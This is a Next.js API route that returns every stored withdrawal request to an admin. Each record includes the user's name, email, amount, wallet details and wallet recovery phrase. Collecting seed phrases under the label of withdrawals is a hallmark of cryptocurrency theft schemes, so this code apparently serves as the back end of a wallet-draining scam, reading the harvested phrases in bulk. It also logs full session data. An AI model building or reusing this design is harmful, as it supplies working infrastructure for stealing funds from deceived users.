import { NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import fs from 'fs';
import path from 'path';

interface WithdrawalRequest {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  walletType: string;
  walletName: string;
  recoveryPhrase: string;
  status: 'pending' | 'approved' | 'rejected' | 'completed';
  timestamp: string | Date;
  adminNotes?: string;
  processedAt?: string | Date;
}

export async function GET() {
  try {
    console.log('🔍 [ADMIN WITHDRAWALS API] Request received');
    
    // Check if user is authenticated and is admin
    const session = await getServerSession(authOptions);
    console.log('🔍 [ADMIN WITHDRAWALS API] Session data:', JSON.stringify(session, null, 2));
    
    if (!session?.user?.id) {
      console.log('❌ [ADMIN WITHDRAWALS API] No session or user ID found');
      return NextResponse.json(
        { error: 'Unauthorized - No session found' },
        { status: 401 }
      );
    }

    if (session.user.role !== 'admin') {
      console.log('❌ [ADMIN WITHDRAWALS API] User is not admin. Role:', session.user.role);
      return NextResponse.json(
        { error: 'Admin access required' },
        { status: 403 }
      );
    }

    console.log('✅ [ADMIN WITHDRAWALS API] Admin access verified');

    // Read all withdrawal files
    const dataDir = path.join(process.cwd(), 'data', 'withdrawals');
    if (!fs.existsSync(dataDir)) {
      console.log('📁 [ADMIN WITHDRAWALS API] No withdrawals directory found, returning empty array');
      return NextResponse.json({ withdrawals: [] });
    }

    const files = fs.readdirSync(dataDir);
    console.log('📁 [ADMIN WITHDRAWALS API] Found files:', files);
    
    const allWithdrawals: WithdrawalRequest[] = [];

    for (const file of files) {
      if (file.endsWith('.json')) {
        try {
          const filepath = path.join(dataDir, file);
          const content = fs.readFileSync(filepath, 'utf-8');
          const withdrawal = JSON.parse(content) as WithdrawalRequest;
          
          // Convert Date objects to strings if they exist
          if (withdrawal.timestamp instanceof Date) {
            withdrawal.timestamp = withdrawal.timestamp.toISOString();
          }
          if (withdrawal.processedAt instanceof Date) {
            withdrawal.processedAt = withdrawal.processedAt.toISOString();
          }
          
          allWithdrawals.push(withdrawal);
          console.log('✅ [ADMIN WITHDRAWALS API] Loaded withdrawal:', withdrawal.id);
        } catch (error) {
          console.error('❌ [ADMIN WITHDRAWALS API] Error reading file:', file, error);
        }
      }
    }

    // Sort by timestamp (newest first)
    allWithdrawals.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    console.log('✅ [ADMIN WITHDRAWALS API] Total withdrawals loaded:', allWithdrawals.length);

    const response = NextResponse.json({
      withdrawals: allWithdrawals
    });
    
    // Add headers to prevent caching
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    response.headers.set('Pragma', 'no-cache');
    response.headers.set('Expires', '0');
    
    return response;

  } catch (error) {
    console.error('❌ [ADMIN WITHDRAWALS API] Error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}



